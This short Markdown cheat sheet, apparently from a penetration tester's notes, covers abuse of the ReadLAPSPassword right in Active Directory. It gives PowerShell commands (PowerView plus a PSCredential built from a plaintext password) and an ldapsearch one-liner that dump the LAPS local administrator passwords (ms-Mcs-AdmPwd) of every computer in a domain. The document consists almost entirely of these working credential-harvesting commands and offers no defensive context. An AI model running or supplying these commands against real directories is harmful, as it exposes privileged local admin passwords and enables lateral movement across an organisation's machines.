---
title: "ReadLAPSPassword"
date: 2024-7-30
tags: ["ReadLAPSPassword", "active driectory", "ad", "Windows", "LAPS"]
---

---
### From Windows

#### Import PowerView.ps1 

```powershell
. .\PowerView.ps1
```

#### Runas

```powershell
$password = ConvertTo-SecureString "password" -AsPlainText -Force
```

```powershell
$cred = New-Object System.Management.Automation.PSCredential("domain\username", $password)
```

```powershell
Get-AdComputer -Filter * -Properties ms-Mcs-AdmPwd -Credential $cred
```

### From Linux

```bash
ldapsearch -h 10.10.11.10 -b 'DC=example,DC=com' -x -D username@example.com -w password "(ms-MCS-AdmPwd=*)" ms-MCS-AdmPwd
```

<br>